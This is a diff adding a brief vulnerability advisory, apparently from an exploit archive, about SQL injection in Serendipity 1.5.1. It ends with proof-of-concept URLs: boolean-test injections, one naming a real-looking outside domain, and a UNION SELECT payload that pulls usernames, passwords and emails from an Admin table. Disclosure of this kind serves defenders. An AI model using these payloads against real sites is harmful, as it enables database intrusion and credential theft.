@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/49395/info
+
+Serendipity is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Serendipity 1.5.1 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/research_display.php?ID=47 and 1=1 //\\ http://www.aarda.org/research_display.php?ID=47 and 1=2
+
+http://www.example.com/research_display.php?ID=-null+UNiON+ALL+SELECT+null,null,null,group_concat%28user,0x3a,pass,0x3a,email%29,null,null,null+FROM+Admin 
